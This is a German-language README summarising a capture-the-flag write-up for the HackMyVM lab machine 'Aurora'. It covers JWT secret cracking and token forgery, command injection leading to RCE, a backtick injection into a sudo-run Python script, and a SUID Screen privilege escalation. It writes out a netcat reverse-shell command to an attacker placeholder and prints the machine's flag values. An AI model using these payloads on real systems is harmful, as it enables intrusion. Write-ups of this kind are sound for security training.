# Aurora - HackMyVM Writeup

![Aurora VM Icon](Aurora.png)

Dieses Repository enthält das Writeup für die HackMyVM-Maschine "Aurora" (Schwierigkeitsgrad: Easy), erstellt von DarkSpirit. Ziel war es, initialen Zugriff auf die virtuelle Maschine zu erlangen und die Berechtigungen bis zum Root-Benutzer zu eskalieren.

## VM-Informationen

*   **VM Name:** Aurora
*   **Plattform:** HackMyVM
*   **Autor der VM:** DarkSpirit
*   **Schwierigkeitsgrad:** Easy
*   **Link zur VM:** [https://hackmyvm.eu/machines/machine.php?vm=Aurora](https://hackmyvm.eu/machines/machine.php?vm=Aurora)

## Writeup-Informationen

*   **Autor des Writeups:** Ben C.
*   **Datum des Berichts:** 03. Mai 2023
*   **Link zum Original-Writeup (GitHub Pages):** [https://alientec1908.github.io/Aurora_HackMyVM_Easy/](https://alientec1908.github.io/Aurora_HackMyVM_Easy/)

## Kurzübersicht des Angriffspfads

Der Angriff auf die Aurora-Maschine umfasste mehrere Phasen:

1.  **Reconnaissance:**
    *   Identifizierung der Ziel-IP (`192.168.2.122`) mittels `arp-scan`.
    *   Ein `nmap`-Scan offenbarte zwei offene Ports: SSH (22, OpenSSH 8.4p1) und HTTP (3000, Node.js Express framework).
2.  **Web Enumeration (Node.js App):**
    *   Die Wurzel `/` auf Port 3000 lieferte einen 404-Fehler. Ein Versuch, RCE via Prototype Pollution mit einem Cookie zu erlangen, schlug fehl.
    *   `ffuf` wurde verwendet, um API-Endpunkte zu finden. `/login`, `/execute` und `/LogIn` antworteten mit `401 Unauthorized`.
    *   Der Endpunkt `/register` wurde gefunden. Eine POST-Anfrage an `/register` ohne Daten ergab "The "role" field is not valid".
    *   Fuzzing des `role`-Parameters mit `ffuf` zeigte, dass `role: user` zu einem `500 Internal Server Error` führte (was auf fehlende andere Felder hindeutete) und `role: admin` zu `401 Unauthorized`.
    *   Eine Registrierung mit `{"role":"user", "username":"ben", "password":"ben"}` war erfolgreich. Ein Versuch, sich als `admin` zu registrieren, schlug fehl ("Username already exists").
3.  **JWT Exploitation (Secret Cracking & Forging):**
    *   Nach erfolgreichem Login (impliziert) wurde ein JSON Web Token (JWT) erhalten.
    *   Der JWT (`eyJhbG...0bMg`) wurde mit `jwt.io` analysiert (Header: HS256, Payload: `{"username": "ben", "role": "user", ...}`).
    *   Das JWT-Secret wurde mit `john` und der `rockyou.txt`-Wortliste als `nopassword` geknackt.
    *   Ein neuer JWT wurde mit dem Payload `{"username": "admin", "role": "admin", ...}` und dem Secret `nopassword` gefälscht.
4.  **Initial Access (www-data RCE):**
    *   Ein Versuch, den `/execute`-Endpunkt mit dem gefälschten Admin-JWT und `{"cmd":"id"}` zu nutzen, schlug fehl (TypeError, "file" argument erwartet).
    *   `ffuf` wurde verwendet, um den korrekten Parameternamen im JSON-Body für `/execute` zu finden: `command`.
    *   Mit dem Admin-JWT und `{"command":"id"}` konnte RCE als Benutzer `www-data` erlangt werden.
    *   Eine Reverse Shell wurde über die RCE-Schwachstelle mit `nc -e /bin/bash [ATTACKER_IP] [PORT]` initiiert und stabilisiert.
5.  **Privilege Escalation (www-data -> doro via Command Injection):**
    *   Die `.bash_history` von `www-data` enthielt den Befehl `sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping`.
    *   Das Skript `/home/doro/tools.py` hatte eine Command Injection-Schwachstelle in der `ping()`-Funktion (unzureichende Filterung von Benutzereingaben, die an `os.system` übergeben wurden).
    *   Die Schwachstelle wurde ausgenutzt, indem bei der IP-Abfrage des Skripts ein Payload mit Backticks (``` `nc -e /bin/bash [ATTACKER_IP] [PORT]` ```) eingegeben wurde, was zu einer Shell als Benutzer `doro` führte.
6.  **Privilege Escalation (doro -> root via Screen Exploit):**
    *   Als `doro` wurde die User-Flag gelesen. Ein SSH-Schlüsselpaar wurde gefunden, und durch Umbenennen von `id_rsa.pub` zu `authorized_keys` wurde SSH-Zugriff als `doro` ermöglicht.
    *   `linpeas.sh` wurde ausgeführt und identifizierte `/usr/bin/screen` (Version 4.5.0) als SUID-Root und potenziell verwundbar.
    *   Ein bekannter Exploit für GNU Screen 4.5.0 (CVE-2017-5229), der `/etc/ld.so.preload` manipuliert, wurde verwendet, um eine Root-Shell zu erlangen.
7.  **Flags:**
    *   Die User-Flag wurde aus `/home/doro/user.txt` gelesen.
    *   Die Root-Flag wurde aus `/root/root.txt` gelesen.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `curl`
*   `nikto`
*   `python` (Payload Generator, Shell/HTTP Server)
*   `gobuster`
*   `ssh-keyscan`
*   `msfconsole` (ssh_enumusers)
*   `ffuf`
*   Web Browser / `jwt.io`
*   `vi` / Editor
*   `john`
*   `nc` (netcat)
*   `stty`
*   `ls`
*   `cat`
*   `sudo`
*   `find`
*   `ss`
*   `chmod`
*   `wget`
*   `linpeas.sh`
*   `gcc`
*   `screen`
*   `id`

## Identifizierte Schwachstellen (Zusammenfassung)

*   **Schwaches JWT-Secret:** Das HS256-Secret für JSON Web Tokens war `nopassword` und konnte leicht geknackt werden, was das Fälschen von Admin-Tokens ermöglichte.
*   **Node.js Command Injection:** Der `/execute`-Endpunkt der Node.js-Anwendung war anfällig für Command Injection, nachdem ein gültiger (gefälschter) Admin-JWT bereitgestellt wurde. Der verwundbare Parameter war `command` im JSON-Body.
*   **Unsichere `sudo`-Konfiguration / Python Command Injection:** Der Benutzer `www-data` konnte ein Python-Skript (`/home/doro/tools.py`) als Benutzer `doro` ausführen. Dieses Skript enthielt eine Command Injection-Schwachstelle in der `ping`-Funktion.
*   **Veraltete `screen`-Version mit SUID-Bit:** `/usr/bin/screen` war Version 4.5.0, SUID-Root gesetzt und anfällig für eine bekannte lokale Privilege Escalation (CVE-2017-5229).

## Flags

*   **User Flag (`/home/doro/user.txt`):** `ccd839df5504a7ace407b5aeca436e81`
*   **Root Flag (`/root/root.txt`):** `052cf26a6e7e33790391c0d869e2e40c`

---

**Wichtiger Hinweis:** Dieses Dokument und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die beschriebenen Techniken und Werkzeuge sollten nur in legalen und autorisierten Umgebungen (z.B. eigenen Testlaboren, CTFs oder mit expliziter Genehmigung) angewendet werden. Das unbefugte Eindringen in fremde Computersysteme ist eine Straftat und kann rechtliche Konsequenzen nach sich ziehen.

---
*Bericht von Ben C. - Cyber Security Reports*
